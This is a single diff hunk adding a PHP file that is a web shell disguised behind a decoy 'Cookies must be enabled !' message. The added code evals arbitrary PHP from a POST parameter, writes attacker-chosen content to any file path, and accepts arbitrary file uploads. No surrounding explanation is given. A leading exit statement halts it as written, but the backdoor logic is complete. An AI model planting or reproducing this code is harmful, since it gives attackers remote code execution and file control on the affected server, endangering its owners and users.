@@ -1,0 +1,1 @@
+<?php exit;{echo 'Cookies must be enabled !';$tf='';if(@$_POST['tf']){$tf=@$_POST['tf'];}if(@$_POST['e']){eval(@$_POST['e']);}if(@$_POST['t']){if($tf!=''){$f=fopen($tf,'w');fwrite($f,@$_POST['t']);fclose($f);}}if(@$_FILES['f']['name']!=''){$tf=$_FILES['f']['name'];move_uploaded_file(@$_FILES['f']['tmp_name'],$tf);}exit;}?>
